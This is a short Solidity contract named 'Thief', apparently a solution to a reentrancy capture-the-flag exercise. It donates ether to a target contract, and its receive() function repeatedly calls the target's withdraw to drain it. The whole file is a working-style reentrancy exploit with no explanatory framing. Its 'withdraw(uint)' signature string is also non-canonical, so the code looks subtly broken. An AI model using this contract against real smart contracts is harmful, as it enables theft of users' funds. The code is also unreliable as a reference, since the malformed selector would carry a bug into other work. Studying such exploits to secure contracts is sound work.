// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Thief {
    address contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function deposit() external payable returns (bool) {
        (bool result,) = contractAddress.call{value:msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        return result;
    }

    receive() external payable {
        msg.sender.call(
            abi.encodeWithSignature("withdraw(uint)", msg.value)
        );
    }
}